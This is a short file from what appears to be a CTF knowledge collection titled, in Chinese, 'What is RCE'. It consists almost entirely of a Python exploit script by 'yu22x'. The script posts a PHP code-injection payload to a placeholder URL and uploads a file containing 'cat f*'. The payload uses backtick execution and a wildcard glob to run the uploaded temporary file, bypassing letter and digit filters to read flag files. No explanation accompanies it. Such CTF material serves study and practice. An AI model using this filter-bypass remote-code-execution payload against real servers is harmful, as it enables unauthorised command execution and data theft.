# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/命令执行.md
# TITLE: 什么是rce
# CATEGORY: web

#coding:utf-8
#author yu22x
import requests
url="http://xxx/test.php?code=?><?=`. /???/????????[@-[]`;?>"
files={'file':'cat f*'}
response=requests.post(url,files=files)
html = response.text
print(html)
